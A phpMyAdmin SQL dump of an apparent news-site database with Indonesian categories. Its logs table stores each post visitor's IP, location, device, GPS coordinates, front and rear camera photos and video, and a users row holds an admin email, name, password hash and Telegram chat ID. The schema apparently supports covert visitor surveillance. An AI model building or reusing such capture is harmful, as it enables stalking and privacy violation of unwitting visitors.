-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Nov 11, 2023 at 09:09 AM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.4.5

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `bms_db`
--

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(11) NOT NULL,
  `category` varchar(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `category`) VALUES
(1, 'Bisnis'),
(2, 'Bola'),
(3, 'Edukasi'),
(4, 'Ekonomi'),
(5, 'Entrepreneur'),
(6, 'Hiburan'),
(7, 'Hukum'),
(8, 'Internasional'),
(9, 'Investment'),
(10, 'Kecantikan'),
(11, 'Kesehatan'),
(12, 'Lifestyle'),
(13, 'Market'),
(14, 'Metro'),
(15, 'Nasional'),
(16, 'Olahraga'),
(17, 'Opini'),
(18, 'Otomotif'),
(19, 'Politik'),
(20, 'Profil'),
(21, 'Sains'),
(22, 'Selebriti'),
(23, 'Syariah'),
(24, 'Teknologi'),
(25, 'Travel');

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE `logs` (
  `id` varchar(16) NOT NULL,
  `post_id` varchar(16) NOT NULL,
  `ip_addr` varchar(32) NOT NULL,
  `ip_loc` varchar(128) NOT NULL,
  `date` date NOT NULL DEFAULT current_timestamp(),
  `net_provider` varchar(64) NOT NULL,
  `browser` varchar(128) NOT NULL,
  `model` varchar(64) NOT NULL,
  `device` varchar(64) NOT NULL,
  `latitude` float NOT NULL,
  `longitude` float NOT NULL,
  `front_photo` varchar(256) NOT NULL,
  `rear_photo` varchar(256) NOT NULL,
  `video` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` varchar(16) NOT NULL,
  `author` int(8) NOT NULL,
  `title` varchar(256) NOT NULL,
  `permalink` varchar(256) NOT NULL,
  `category` varchar(64) NOT NULL,
  `date` date NOT NULL DEFAULT current_timestamp(),
  `contents` text NOT NULL,
  `tags` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(8) NOT NULL,
  `email` varchar(32) NOT NULL,
  `passwd` varchar(64) NOT NULL,
  `fullname` varchar(64) NOT NULL,
  `role` varchar(16) NOT NULL COMMENT 'admin\r\nauthor',
  `tg_chat_id` bigint(20) NOT NULL,
  `delay` int(11) NOT NULL DEFAULT 1000
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `email`, `passwd`, `fullname`, `role`, `tg_chat_id`, `delay`) VALUES
(1, 'admin@gmail.com', '$2y$12$HP9yMU7ND.83aak5UmmDM.xXm24RuxXcq8cEfhPgCS5C2yoA8jM0q', 'Jason Alava', 'admin', 6280744585, 1000);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `post_id` (`post_id`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `author_id` (`author`) USING BTREE;

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `logs`
--
ALTER TABLE `logs`
  ADD CONSTRAINT `post_id` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE;

--
-- Constraints for table `posts`
--
ALTER TABLE `posts`
  ADD CONSTRAINT `author_idx` FOREIGN KEY (`author`) REFERENCES `users` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
